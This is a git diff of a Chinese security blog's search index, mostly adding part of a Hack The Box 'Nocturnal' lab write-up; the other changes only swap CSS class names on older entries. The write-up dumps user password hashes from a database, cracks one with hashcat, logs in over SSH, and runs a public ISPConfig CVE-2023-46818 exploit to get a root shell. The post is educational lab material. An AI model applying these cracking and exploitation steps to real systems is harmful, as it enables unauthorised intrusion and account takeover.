+$ <span class="token builtin class-name">cd</span> <span class="token punctuation">..</span>
+$ <span class="token function">ls</span>
+html
+ispconfig
+nocturnal.htb
+nocturnal_database
+php-fcgi-scripts
+$ strings nocturnal_database.db 
+SQLite <span class="token function">format</span> <span class="token number">3</span>
+<span class="token operator">&lt;</span><span class="token punctuation">..</span>.<span class="token operator">></span>
+indexsqlite_autoindex_users_1users
+Mtestrefe8de352cd483af54ec60595508e54e,	
+Madmin123e6e061838856bf47e1de730719fb2609<span class="token punctuation">(</span>
+Mtest098f6bcd4621d373cade4e832627b4f6<span class="token punctuation">)</span>
+Me0Al5101ad4543a96a7fd84908fd0d802e7db<span class="token punctuation">(</span>
+Mkavif38cde1654b39fea2bd4f72f1ae4cdda*
+Mtobias55c82b1ccd55ab219b3b109b07d5061d*
+Mamandadf8b20aa0c935023f99ea58358fb63c4<span class="token punctuation">)</span>
+Madmind725aeba143f575736b07e045d8ceebb
+testr
+admin123	
+<span class="token builtin class-name">test</span>
+e0Al5
+kavi
+tobias
+amanda
+<span class="token operator">&lt;</span><span class="token punctuation">..</span>.<span class="token operator">></span>
+$ <span class="token function">ls</span> /home
+tobias
+</code></pre>
+
+<h3 id="密码破解"><a href="#密码破解" class="headerlink" title="密码破解"></a>密码破解</h3><p>使用hashcat 破解密码</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">$ hashcat <span class="token builtin class-name">hash</span> <span class="token parameter variable">-a</span> <span class="token number">0</span> <span class="token parameter variable">-m</span> <span class="token number">0</span>  /opt/secLists/rockyou.txt    
+hashcat <span class="token punctuation">(</span>v6.2.6<span class="token punctuation">)</span> starting
+
+<span class="token operator">&lt;</span><span class="token punctuation">..</span>.<span class="token operator">></span>
+Dictionary cache built:
+* Filename<span class="token punctuation">..</span>: /opt/secLists/rockyou.txt
+* Passwords.: <span class="token number">14344391</span>
+* Bytes<span class="token punctuation">..</span><span class="token punctuation">..</span>.: <span class="token number">139921497</span>
+* Keyspace<span class="token punctuation">..</span>: <span class="token number">14344384</span>
+* Runtime<span class="token punctuation">..</span>.: <span class="token number">0</span> secs
+
+55c82b1ccd55ab219b3b109b07d5061d:slowmotionapocalypse     
+                                                          
+Session<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>: hashcat
+Status<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.: Cracked
+Hash.Mode<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>: <span class="token number">0</span> <span class="token punctuation">(</span>MD5<span class="token punctuation">)</span>
+Hash.Target<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>: 55c82b1ccd55ab219b3b109b07d5061d
+Time.Started<span class="token punctuation">..</span><span class="token punctuation">..</span>.: Sat Apr <span class="token number">19</span> <span class="token number">21</span>:41:24 <span class="token number">2025</span> <span class="token punctuation">(</span><span class="token number">1</span> sec<span class="token punctuation">)</span>
+Time.Estimated<span class="token punctuation">..</span>.: Sat Apr <span class="token number">19</span> <span class="token number">21</span>:41:25 <span class="token number">2025</span> <span class="token punctuation">(</span><span class="token number">0</span> secs<span class="token punctuation">)</span>
+Kernel.Feature<span class="token punctuation">..</span>.: Pure Kernel
+Guess.Base<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.: File <span class="token punctuation">(</span>/opt/secLists/rockyou.txt<span class="token punctuation">)</span>
+Guess.Queue<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>: <span class="token number">1</span>/1 <span class="token punctuation">(</span><span class="token number">100.00</span>%<span class="token punctuation">)</span>
+Speed.<span class="token comment">#1.........: 14555.5 kH/s (0.17ms) @ Accel:1024 Loops:1 Thr:1 Vec:16</span>
+Recovered<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>: <span class="token number">1</span>/1 <span class="token punctuation">(</span><span class="token number">100.00</span>%<span class="token punctuation">)</span> Digests <span class="token punctuation">(</span>total<span class="token punctuation">)</span>, <span class="token number">1</span>/1 <span class="token punctuation">(</span><span class="token number">100.00</span>%<span class="token punctuation">)</span> Digests <span class="token punctuation">(</span>new<span class="token punctuation">)</span>
+Progress<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.: <span class="token number">3702784</span>/14344384 <span class="token punctuation">(</span><span class="token number">25.81</span>%<span class="token punctuation">)</span>
+Rejected<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.: <span class="token number">0</span>/3702784 <span class="token punctuation">(</span><span class="token number">0.00</span>%<span class="token punctuation">)</span>
+Restore.Point<span class="token punctuation">..</span><span class="token punctuation">..</span>: <span class="token number">3686400</span>/14344384 <span class="token punctuation">(</span><span class="token number">25.70</span>%<span class="token punctuation">)</span>
+Restore.Sub.<span class="token comment">#1...: Salt:0 Amplifier:0-1 Iteration:0-1</span>
+Candidate.Engine.: Device Generator
+Candidates.<span class="token comment">#1....: smartpimps -> slaton01</span>
+Hardware.Mon.<span class="token comment">#1..: Temp: 62c Util:  6%</span>
+
+Started: Sat Apr <span class="token number">19</span> <span class="token number">21</span>:41:09 <span class="token number">2025</span>
+Stopped: Sat Apr <span class="token number">19</span> <span class="token number">21</span>:41:25 <span class="token number">2025</span>
+</code></pre>
+
+<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>使用破解出的密码登录ssh，可以找到ispconfig服务运行在8080</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">ssh</span> tobias@nocturnal.htb                                                                                                                              
+tobias@nocturnal.htb's password: 
+<span class="token operator">&lt;</span><span class="token punctuation">..</span>.<span class="token operator">></span>
+Last login: Sat Apr <span class="token number">19</span> <span class="token number">13</span>:24:43 <span class="token number">2025</span> from <span class="token number">10.10</span>.16.24
+tobias@nocturnal:~$ <span class="token function">whoami</span>
+tobias
+tobias@nocturnal:~$ <span class="token function">id</span>
+<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>tobias<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>tobias<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>tobias<span class="token punctuation">)</span>
+tobias@nocturnal:/var/www$ <span class="token function">ls</span> <span class="token parameter variable">-la</span>
+total <span class="token number">24</span>
+drwxr-xr-x  <span class="token number">6</span> ispconfig ispconfig <span class="token number">4096</span> Apr <span class="token number">14</span> 09:26 <span class="token builtin class-name">.</span>
+drwxr-xr-x <span class="token number">14</span> root      root      <span class="token number">4096</span> Oct <span class="token number">18</span>  <span class="token number">2024</span> <span class="token punctuation">..</span>
+drwxr-xr-x  <span class="token number">2</span> root      root      <span class="token number">4096</span> Mar  <span class="token number">4</span> <span class="token number">15</span>:02 html
+lrwxrwxrwx  <span class="token number">1</span> root      root        <span class="token number">34</span> Oct <span class="token number">17</span>  <span class="token number">2024</span> ispconfig -<span class="token operator">></span> /usr/local/ispconfig/interface/web
+drwxr-xr-x  <span class="token number">2</span> www-data  www-data  <span class="token number">4096</span> Apr <span class="token number">19</span> 09:22 nocturnal_database
+drwxr-xr-x  <span class="token number">4</span> www-data  www-data  <span class="token number">4096</span> Apr <span class="token number">19</span> <span class="token number">13</span>:20 nocturnal.htb
+drwxr-xr-x  <span class="token number">4</span> ispconfig ispconfig <span class="token number">4096</span> Oct <span class="token number">17</span>  <span class="token number">2024</span> php-fcgi-scripts
+tobias@nocturnal:/var/www$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
+<span class="token punctuation">[</span>sudo<span class="token punctuation">]</span> password <span class="token keyword">for</span> tobias: 
+Sorry, user tobias may not run <span class="token function">sudo</span> on nocturnal.
+tobias@nocturnal:/var/www$ ss <span class="token parameter variable">-aunt</span>
+Netid           State            Recv-Q           Send-Q                     Local Address:Port                      Peer Address:Port           Process           
+udp             UNCONN           <span class="token number">0</span>                <span class="token number">0</span>                          <span class="token number">127.0</span>.0.53%lo:53                             <span class="token number">0.0</span>.0.0:*                                
+tcp             LISTEN           <span class="token number">0</span>                <span class="token number">10</span>                             <span class="token number">127.0</span>.0.1:25                             <span class="token number">0.0</span>.0.0:*                                
+tcp             LISTEN           <span class="token number">0</span>                <span class="token number">70</span>                             <span class="token number">127.0</span>.0.1:33060                          <span class="token number">0.0</span>.0.0:*                                
+tcp             LISTEN           <span class="token number">0</span>                <span class="token number">151</span>                            <span class="token number">127.0</span>.0.1:3306                           <span class="token number">0.0</span>.0.0:*                                
+tcp             LISTEN           <span class="token number">0</span>                <span class="token number">10</span>                             <span class="token number">127.0</span>.0.1:587                            <span class="token number">0.0</span>.0.0:*                                
+tcp             LISTEN           <span class="token number">0</span>                <span class="token number">4096</span>                           <span class="token number">127.0</span>.0.1:8080                           <span class="token number">0.0</span>.0.0:*                                
+tcp             LISTEN           <span class="token number">0</span>                <span class="token number">511</span>                              <span class="token number">0.0</span>.0.0:80                             <span class="token number">0.0</span>.0.0:*                                
+tcp             LISTEN           <span class="token number">0</span>                <span class="token number">4096</span>                       <span class="token number">127.0</span>.0.53%lo:53                             <span class="token number">0.0</span>.0.0:*                                
+tcp             LISTEN           <span class="token number">0</span>                <span class="token number">128</span>                              <span class="token number">0.0</span>.0.0:22                             <span class="token number">0.0</span>.0.0:*                                
+tcp             ESTAB            <span class="token number">0</span>                <span class="token number">36</span>                           <span class="token number">10.10</span>.11.64:22                         <span class="token number">10.10</span>.16.24:41832                            
+tcp             ESTAB            <span class="token number">0</span>                <span class="token number">0</span>                            <span class="token number">10.10</span>.11.64:40554                      <span class="token number">10.10</span>.16.24:9001                             
+tcp             LISTEN           <span class="token number">0</span>                <span class="token number">128</span>                                 <span class="token punctuation">[</span>::<span class="token punctuation">]</span>:22                                <span class="token punctuation">[</span>::<span class="token punctuation">]</span>:*            </code></pre>
+
+<p>使用ssh 进行本地端口转发<code>ssh tobias@nocturnal.htb -L 8081:127.0.0.1:8080</code></p>
+<p>访问本地8081端口，可以看到ispconfig</p>
+<img src="/Hackthebox/htb/htb-nocturnal/image-20250419214933108.png" class="" title="ispconfig">
+
+<p>使用admin和破解出的密码的登录，登录成功，找到版本号为3.2.10p1</p>
+<img src="/Hackthebox/htb/htb-nocturnal/image-20250419215703693.png" class="" title="ispconfig">
+
+<p>搜索exp，找到CVE-2023-46818，在github检索利用脚本</p>
+<img src="/Hackthebox/htb/htb-nocturnal/image-20250419220423834.png" class="" title="exp">
+
+
+
+<img src="/Hackthebox/htb/htb-nocturnal/image-20250419220537140.png" class="" title="github">
+
+
+
+<p>提权成功</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">$ python3 exploit.py http://127.0.0.1:8081 admin slowmotionapocalypse
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Target URL: http://127.0.0.1:8081/
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Logging <span class="token keyword">in</span> with username <span class="token string">'admin'</span> and password <span class="token string">'slowmotionapocalypse'</span>
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Injecting shell
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Launching shell
+
+ispconfig-shell<span class="token comment"># id</span>
+<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span>
+
+ispconfig-shell<span class="token comment"># cat /root/root.txt</span></code></pre>
+
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>Path</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Flag1</td>
+<td>&#x2F;home&#x2F;tobias&#x2F;user.txt</td>
+</tr>
+<tr>
+<td>Flag2</td>
+<td>&#x2F;root&#x2F;root.txt</td>
+</tr>
+</tbody></table>
+]]></content>
+      <categories>
+        <category>Hackthebox</category>
+      </categories>
+      <tags>
+        <tag>密码重用</tag>
+        <tag>CVE</tag>
+        <tag>越权</tag>
+        <tag>命令注入</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Ubuntu 24.04 应用、字体及截图模糊解决方案</title>
     <url>/OS%E4%BC%98%E5%8C%96/os/ubuntu%E4%BC%98%E5%8C%962/</url>
     <content><![CDATA[<h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>Ubuntu 24.04 默认使用Wayland 作为窗口管理器，当 GNOME 桌面设置分数倍缩放后，截图和一些应用会变得模糊，如vscode、Pycharm、typra ，截图更是难崩</p>
@@ -194,7 +683,7 @@
   <entry>
     <title>HTB-Previse</title>
     <url>/Hackthebox/htb/htb-previse/</url>
-    <content><![CDATA[<style>.pfxsmqgzjbky{zoom:50%;}</style><img src="/Hackthebox/htb/htb-previse/e3c542ada4b134e29e534e3081ef9650.png" class="pfxsmqgzjbky">
+    <content><![CDATA[<style>.gyrgpoikmhyh{zoom:50%;}</style><img src="/Hackthebox/htb/htb-previse/e3c542ada4b134e29e534e3081ef9650.png" class="gyrgpoikmhyh">
 
 <span id="more"></span>
 
@@ -422,7 +911,7 @@ root@previse:/tmp<span class="token comment"># id      </span>
   <entry>
     <title>HTB-Busqueda</title>
     <url>/Hackthebox/htb/htb-busqueda/</url>
-    <content><![CDATA[<style>.zkjrtydhtlfm{zoom:50%;}</style><img src="/Hackthebox/htb/htb-busqueda/a6942ab57b6a79f71240420442027334.png" class="zkjrtydhtlfm">
+    <content><![CDATA[<style>.xlpfwnjtbytc{zoom:50%;}</style><img src="/Hackthebox/htb/htb-busqueda/a6942ab57b6a79f71240420442027334.png" class="xlpfwnjtbytc">
 
 <span id="more"></span>
 
@@ -683,7 +1172,7 @@ connect to <span class="token punctuation">[</span><span class="token number">10
   <entry>
     <title>HTB-Sauna</title>
     <url>/Hackthebox/htb/htb-sauna/</url>
-    <content><![CDATA[<style>.vrxfnigykzlw{zoom:50%;}</style><img src="/Hackthebox/htb/htb-sauna/f31d5d0264fadc267e7f38a9d7729d14.png" class="vrxfnigykzlw">
+    <content><![CDATA[<style>.bdpdxoejuiqb{zoom:50%;}</style><img src="/Hackthebox/htb/htb-sauna/f31d5d0264fadc267e7f38a9d7729d14.png" class="bdpdxoejuiqb">
 
 <span id="more"></span>
 
@@ -949,7 +1438,7 @@ nt authority<span class="token punctuation">\</span>system
   <entry>
     <title>HTB-Heist</title>
     <url>/Hackthebox/htb/htb-heist/</url>
-    <content><![CDATA[<style>.qbwjlyvupser{zoom:50%;}</style><img src="/Hackthebox/htb/htb-heist/131dbaba68b169bd5ff59ac09420b09f.png" class="qbwjlyvupser">
+    <content><![CDATA[<style>.wybbunmsvrco{zoom:50%;}</style><img src="/Hackthebox/htb/htb-heist/131dbaba68b169bd5ff59ac09420b09f.png" class="wybbunmsvrco">
 
 <span id="more"></span>
 
@@ -1245,7 +1734,7 @@ Mode                LastWriteTime         Length Name
   <entry>
     <title>HTB-Toolbox</title>
     <url>/Hackthebox/htb/htb-toolbox/</url>
-    <content><![CDATA[<style>.aumbhfmhukoe{zoom:50%;}</style><img src="/Hackthebox/htb/htb-toolbox/9d218e64149bfb00a002d94868f2e4b1.png" class="aumbhfmhukoe">
+    <content><![CDATA[<style>.lemmintmsunx{zoom:50%;}</style><img src="/Hackthebox/htb/htb-toolbox/9d218e64149bfb00a002d94868f2e4b1.png" class="lemmintmsunx">
 
 <span id="more"></span>
 
@@ -1594,7 +2083,7 @@ administrator@TOOLBOX C:<span class="token punctuation">\</span>Users<span class
   <entry>
     <title>HTB-Mirai</title>
     <url>/Hackthebox/htb/htb-mirai/</url>
-    <content><![CDATA[<style>.bctspyucjuhg{zoom:50%;}</style><img src="/Hackthebox/htb/htb-mirai/4ef1ea77e69185063d4200d7d0142baa.png" class="bctspyucjuhg">
+    <content><![CDATA[<style>.lhhqeywvtgje{zoom:50%;}</style><img src="/Hackthebox/htb/htb-mirai/4ef1ea77e69185063d4200d7d0142baa.png" class="lhhqeywvtgje">
 
 <span id="more"></span>
 
@@ -1781,7 +2270,7 @@ Do you know <span class="token keyword">if</span> there is any way to get them b
   <entry>
     <title>HTB-Blocky</title>
     <url>/Hackthebox/htb/htb-blocky/</url>
-    <content><![CDATA[<style>.powjghxcvqim{zoom:50%;}</style><img src="/Hackthebox/htb/htb-blocky/f412784c311bdf52c3655381d2c9cd21.png" class="powjghxcvqim">
+    <content><![CDATA[<style>.mwqoldodvvbt{zoom:50%;}</style><img src="/Hackthebox/htb/htb-blocky/f412784c311bdf52c3655381d2c9cd21.png" class="mwqoldodvvbt">
 
 <span id="more"></span>
 
@@ -1928,7 +2417,7 @@ root@Blocky:~<span class="token comment"># id</span>
   <entry>
     <title>HTB-Remote</title>
     <url>/Hackthebox/htb/htb-remote/</url>
-    <content><![CDATA[<style>.yzbbinjnhsxe{zoom:50%;}</style><img src="/Hackthebox/htb/htb-remote/8d7c152dc9c28c9556b07dc724c6a37b.png" class="yzbbinjnhsxe">
+    <content><![CDATA[<style>.ewkkqqpwefts{zoom:50%;}</style><img src="/Hackthebox/htb/htb-remote/8d7c152dc9c28c9556b07dc724c6a37b.png" class="ewkkqqpwefts">
 
 <span id="more"></span>
 
@@ -2169,7 +2658,7 @@ meterpreter <span class="token operator">></span>
   <entry>
     <title>HTB-Love</title>
     <url>/Hackthebox/htb/htb-love/</url>
-    <content><![CDATA[<style>.gkrrjwrglsys{zoom:50%;}</style><img src="/Hackthebox/htb/htb-love/c00774d8d806b82c709c596937a92d14.png" class="gkrrjwrglsys">
+    <content><![CDATA[<style>.ipgwjghfsvqt{zoom:50%;}</style><img src="/Hackthebox/htb/htb-love/c00774d8d806b82c709c596937a92d14.png" class="ipgwjghfsvqt">
 
 <span id="more"></span>
 
@@ -2377,7 +2866,7 @@ Server username: NT AUTHORITY<span class="token punctuation">\</span>SYSTEM</cod
   <entry>
     <title>HTB-BountyHunter</title>
     <url>/Hackthebox/htb/htb-bountyhunter/</url>
-    <content><![CDATA[<style>.ayxkdimfzdqb{zoom:50%;}</style><img src="/Hackthebox/htb/htb-bountyhunter/a24c032885e56a17a6c74cc58b63e8f4.png" class="ayxkdimfzdqb">
+    <content><![CDATA[<style>.ccluajqlhjym{zoom:50%;}</style><img src="/Hackthebox/htb/htb-bountyhunter/a24c032885e56a17a6c74cc58b63e8f4.png" class="ccluajqlhjym">
 
 <span id="more"></span>
 
@@ -2566,7 +3055,7 @@ __Ticket Code:__
   <entry>
     <title>HTB-DevOops</title>
     <url>/Hackthebox/htb/htb-devoops/</url>
-    <content><![CDATA[<style>.uoxcjqdcqfvb{zoom:50%;}</style><img src="/Hackthebox/htb/htb-devoops/c74d84352f781ad5c7a4c35c0c3aa0ac.png" class="uoxcjqdcqfvb">
+    <content><![CDATA[<style>.trnnszgtqcev{zoom:50%;}</style><img src="/Hackthebox/htb/htb-devoops/c74d84352f781ad5c7a4c35c0c3aa0ac.png" class="trnnszgtqcev">
 
 <span id="more"></span>
 
@@ -2872,8 +3361,8 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
 <img src="/DevSecOps/tools/fortifyssc/DraggedImage-10.png" class="" title="webapps">
 <p>进入<code>Apache Software Foundation\\Tomcat 9.0\\bin</code>, 点开tomcat9w –&gt; Java –&gt; Java options 添加<code>-Dfortify.home=E:\SSC\fortify </code>  –&gt; 修改内存(初始化4G，最大推荐16以上) –&gt; 应用, 然后启动Tomcat</p>
 <img src="/DevSecOps/tools/fortifyssc/DraggedImage-11.png" class="">
-<style>.gqiywdlfcelx{zoom:150%;}</style><img src="/DevSecOps/tools/fortifyssc/DraggedImage-12.png" class="gqiywdlfcelx" alt="修改配置">
-<style>.stxsxmlqhukj{zoom:150%;}</style><img src="/DevSecOps/tools/fortifyssc/DraggedImage-13.png" class="stxsxmlqhukj">
+<style>.tvaxwerhjwnp{zoom:150%;}</style><img src="/DevSecOps/tools/fortifyssc/DraggedImage-12.png" class="tvaxwerhjwnp" alt="修改配置">
+<style>.tcsgdldvpykh{zoom:150%;}</style><img src="/DevSecOps/tools/fortifyssc/DraggedImage-13.png" class="tcsgdldvpykh">
 
 <h4 id="安装SSC"><a href="#安装SSC" class="headerlink" title="安装SSC"></a>安装SSC</h4><p> 打开浏览器访问 <a href="http://127.0.0.1:8080/ssc/">http://127.0.0.1:8080/ssc/</a></p>
 <img src="/DevSecOps/tools/fortifyssc/DraggedImage-14.png" class="" title="访问SSC">
@@ -2910,7 +3399,7 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
   <entry>
     <title>HTB-Jerry</title>
     <url>/Hackthebox/htb/htb-jerry/</url>
-    <content><![CDATA[<style>.xhycullklpav{zoom:50%;}</style><img src="/Hackthebox/htb/htb-jerry/59f03a24178dbb2bdc94968c201e21f8.png" class="xhycullklpav">
+    <content><![CDATA[<style>.tceuncahydbv{zoom:50%;}</style><img src="/Hackthebox/htb/htb-jerry/59f03a24178dbb2bdc94968c201e21f8.png" class="tceuncahydbv">
 
 <span id="more"></span>
 
@@ -2970,7 +3459,7 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
   <entry>
     <title>HTB-Blue</title>
     <url>/Hackthebox/htb/htb-blue/</url>
-    <content><![CDATA[<style>.jtoxliipvrmu{zoom:50%;}</style><img src="/Hackthebox/htb/htb-blue/52e077ae40899ab8b024afd51cb29b1c.png" class="jtoxliipvrmu">
+    <content><![CDATA[<style>.wkugoovlbuaf{zoom:50%;}</style><img src="/Hackthebox/htb/htb-blue/52e077ae40899ab8b024afd51cb29b1c.png" class="wkugoovlbuaf">
 
 <span id="more"></span>
 
@@ -3020,7 +3509,7 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
   <entry>
     <title>HTB-Knife</title>
     <url>/Hackthebox/htb/htb-knife/</url>
-    <content><![CDATA[<style>.szofhcxjutyk{zoom:50%;}</style><img src="/Hackthebox/htb/htb-knife/110fe6608793064cf171080150ebd0dc.png" class="szofhcxjutyk">
+    <content><![CDATA[<style>.iitegdfbitbs{zoom:50%;}</style><img src="/Hackthebox/htb/htb-knife/110fe6608793064cf171080150ebd0dc.png" class="iitegdfbitbs">
 
 <span id="more"></span>
 
@@ -3087,7 +3576,7 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
   <entry>
     <title>HTB-Shocker</title>
     <url>/Hackthebox/htb/htb-shocker/</url>
-    <content><![CDATA[<style>.genlbcsicbeq{zoom:50%;}</style><img src="/Hackthebox/htb/htb-shocker/efef52a0fb63d9c8db0ab6e50cb6ac79.png" class="genlbcsicbeq">
+    <content><![CDATA[<style>.bcakrkmyoelt{zoom:50%;}</style><img src="/Hackthebox/htb/htb-shocker/efef52a0fb63d9c8db0ab6e50cb6ac79.png" class="bcakrkmyoelt">
 
 <span id="more"></span>
 
@@ -3147,7 +3636,7 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
   <entry>
     <title>HTB-Tenten</title>
     <url>/Hackthebox/htb/htb-tenten/</url>
-    <content><![CDATA[<style>.pwviktuzgvzx{zoom:50%;}</style><img src="/Hackthebox/htb/htb-tenten/e58a465e93364c423cd2162945f8f7bf.png" class="pwviktuzgvzx">
+    <content><![CDATA[<style>.wnguoeriuqhy{zoom:50%;}</style><img src="/Hackthebox/htb/htb-tenten/e58a465e93364c423cd2162945f8f7bf.png" class="wnguoeriuqhy">
 
 <span id="more"></span>
 
@@ -3227,7 +3716,7 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
   <entry>
     <title>HTB-Bastard</title>
     <url>/Hackthebox/htb/htb-bastard/</url>
-    <content><![CDATA[<style>.pnoaybolkarq{zoom:50%;}</style><img src="/Hackthebox/htb/htb-bastard/a8d2ae87fbe6d1ccfe93522d74defb3a.png" class="pnoaybolkarq">
+    <content><![CDATA[<style>.wdcfhnsojldt{zoom:50%;}</style><img src="/Hackthebox/htb/htb-bastard/a8d2ae87fbe6d1ccfe93522d74defb3a.png" class="wdcfhnsojldt">
 
 <span id="more"></span>
 
@@ -3302,7 +3791,7 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
   <entry>
     <title>HTB-Granny</title>
     <url>/Hackthebox/htb/htb-granny/</url>
-    <content><![CDATA[<style>.hxkymrstdpjq{zoom:50%;}</style><img src="/Hackthebox/htb/htb-granny/e8a122e2d713a4fb4a180bb9ccd20248.png" class="hxkymrstdpjq">
+    <content><![CDATA[<style>.uvwqktdzmbbl{zoom:50%;}</style><img src="/Hackthebox/htb/htb-granny/e8a122e2d713a4fb4a180bb9ccd20248.png" class="uvwqktdzmbbl">
 
 <span id="more"></span>
 
@@ -3361,7 +3850,7 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
   <entry>
     <title>HTB-Grandpa</title>
     <url>/Hackthebox/htb/htb-grandpa/</url>
-    <content><![CDATA[<style>.jhavesbmdpul{zoom:50%;}</style><img src="/Hackthebox/htb/htb-grandpa/381683fd107da11f1dc916401ae8aee0.png" class="jhavesbmdpul">
+    <content><![CDATA[<style>.sccybjmojofd{zoom:50%;}</style><img src="/Hackthebox/htb/htb-grandpa/381683fd107da11f1dc916401ae8aee0.png" class="sccybjmojofd">
 
 <span id="more"></span>
 
@@ -3421,7 +3910,7 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
   <entry>
     <title>HTB-Arctic</title>
     <url>/Hackthebox/htb/htb-arctic/</url>
-    <content><![CDATA[<style>.asyheegvdvse{zoom:50%;}</style><img src="/Hackthebox/htb/htb-arctic/0d6275efbd5e48fcdc96e61b9724ae5e.png" class="asyheegvdvse">
+    <content><![CDATA[<style>.tgpxdyjixxdl{zoom:50%;}</style><img src="/Hackthebox/htb/htb-arctic/0d6275efbd5e48fcdc96e61b9724ae5e.png" class="tgpxdyjixxdl">
 
 <span id="more"></span>
 
@@ -3494,7 +3983,7 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
   <entry>
     <title>HTB-Legacy</title>
     <url>/Hackthebox/htb/htb-legacy/</url>
-    <content><![CDATA[<style>.pnqsoglscroc{zoom:50%;}</style><img src="/Hackthebox/htb/htb-legacy/60dc190c4c015cfe3a3aef9b5afca254.png" class="pnqsoglscroc">
+    <content><![CDATA[<style>.bcoegqekkfob{zoom:50%;}</style><img src="/Hackthebox/htb/htb-legacy/60dc190c4c015cfe3a3aef9b5afca254.png" class="bcoegqekkfob">
 
 <span id="more"></span>
 
@@ -3542,7 +4031,7 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
   <entry>
     <title>HTB-Devel</title>
     <url>/Hackthebox/htb/htb-devel/</url>
-    <content><![CDATA[<style>.barxkywhfmyd{zoom:50%;}</style><img src="/Hackthebox/htb/htb-devel/0fb6455a29eb4f2682f04a780ce26cb1.png" class="barxkywhfmyd">
+    <content><![CDATA[<style>.agyflnbqnsgx{zoom:50%;}</style><img src="/Hackthebox/htb/htb-devel/0fb6455a29eb4f2682f04a780ce26cb1.png" class="agyflnbqnsgx">
 
 <span id="more"></span>
 
@@ -3561,7 +4050,7 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
 <h3 id="Nmap-scan"><a href="#Nmap-scan" class="headerlink" title="Nmap scan"></a>Nmap scan</h3><img src="/Hackthebox/htb/htb-devel/image-20250201213314487.png" class="" title="Nmap">
 
 <p>发现两个开放端口 21和80，FTP允许匿名登录，先登录FTP看看，FTP的目录底下是主站点的文件</p>
-<style>.pcyrsrsyhrsk{zoom:150%;}</style><img src="/Hackthebox/htb/htb-devel/image-20250201213757511.png" class="pcyrsrsyhrsk" alt="登录FTP">
+<style>.fwpxdbdqczxd{zoom:150%;}</style><img src="/Hackthebox/htb/htb-devel/image-20250201213757511.png" class="fwpxdbdqczxd" alt="登录FTP">
 
 <h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>生成一个webshell然后通过ftp上传</p>
 <img src="/Hackthebox/htb/htb-devel/image-20250201215256322.png" class="" title="生成webshell">
@@ -3603,7 +4092,7 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
   <entry>
     <title>HTB-Lame</title>
     <url>/Hackthebox/htb/htb-lame/</url>
-    <content><![CDATA[<style>.oijuaykkquwj{zoom:50%;}</style><img src="/Hackthebox/htb/htb-lame/fb2d9f98400e3c802a0d7145e125c4ff.png" class="oijuaykkquwj">
